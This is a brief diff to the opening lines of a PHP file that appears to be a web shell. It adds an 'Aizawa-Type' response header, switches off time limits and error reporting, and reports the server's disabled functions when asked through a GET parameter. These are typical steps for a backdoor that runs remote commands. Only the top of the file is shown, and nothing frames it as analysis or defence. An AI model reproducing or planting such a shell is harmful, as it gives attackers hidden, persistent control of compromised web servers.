@@ -1,4 +1,6 @@
-<?php set_time_limit(0);
+<?php 
+header('Aizawa-Type: http_accept_language_get');
+set_time_limit(0);
 error_reporting(0);
 if (isset($_GET['disable_functions'])) {
     echo (!empty(ini_get('disable_functions')) ? ini_get('disable_functions') : 'NONE');
